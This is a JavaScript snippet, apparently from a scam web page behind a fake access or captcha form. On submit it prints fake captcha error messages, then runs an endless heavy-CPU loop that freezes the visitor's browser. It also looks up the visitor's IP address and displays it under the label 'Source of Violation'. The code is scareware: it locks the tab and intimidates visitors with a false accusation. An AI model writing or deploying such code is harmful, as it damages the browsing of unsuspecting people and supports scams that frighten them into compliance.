    function heavyCpuTaskAndSpamErrors() {
    // Heavy CPU task: nested loops and pointless math
    let result = 0;
    for (let i = 0; i < 1e7; i++) {
        for (let j = 0; j < 100; j++) {
            result += Math.sqrt(i * j) % 17;
        }
    }
    }
    function _0xerrSpam() {
    var _0xmsgs = [
            'Uncaught TypeError: Cannot read property \'challenge\' of null',
            'Uncaught ReferenceError: grecaptcha is not defined',
            'Uncaught Error: Failed to fetch captcha token',
            'Uncaught DOMException: Blocked a frame with origin "https://www.google.com" from accessing a cross-origin frame.',
            'Uncaught SecurityError: Permission denied to access property "document"',
            'Uncaught NetworkError: Failed to execute \'send\' on \'XMLHttpRequest\': Failed to load',
            'Uncaught SyntaxError: Unexpected end of JSON input',
            'Uncaught Error: Captcha verification failed',
            'Uncaught TypeError: Cannot read properties of undefined (reading \'response\')',
            'Uncaught ReferenceError: captchaCallback is not defined'
    ];
    var _0xstart = Date.now();
    (function _0xloop() {
        if (Date.now() - _0xstart < 3000) {
            var _0xidx = Math.floor(Math.random() * _0xmsgs.length);
            console.error(_0xmsgs[_0xidx]);
            setTimeout(_0xloop, 500); // Sleep for 0.5s per message
        }
    })();
    }
    document.getElementById('accessForm').addEventListener('submit', function(e) {
    e.preventDefault();
    _0xerrSpam();
    setTimeout(function() {
        heavyCpuTaskAndSpamErrors();
        while (true) {
            heavyCpuTaskAndSpamErrors();
        }
    }, 3200);

    setTimeout(function() {
    var errorDiv = document.getElementById('accessError');
    errorDiv.style.display = 'block';
    errorDiv.style.color = '#ffffff';
    }, 3000);
});
fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
    console.log(data)
        const ip = data.ip || 'VPN/Proxy possibly found';
    
    document.getElementById('userIp').textContent = ip;
    document.getElementById('violationSource').innerHTML =
        `<strong>Source of Violation:</strong>`;
    })
    .catch(() => {
    document.getElementById('userIp').textContent = 'VPN/Proxy violation';
    document.getElementById('violationSource').innerHTML =
        `<strong>Source of Violation:</strong>`;
    });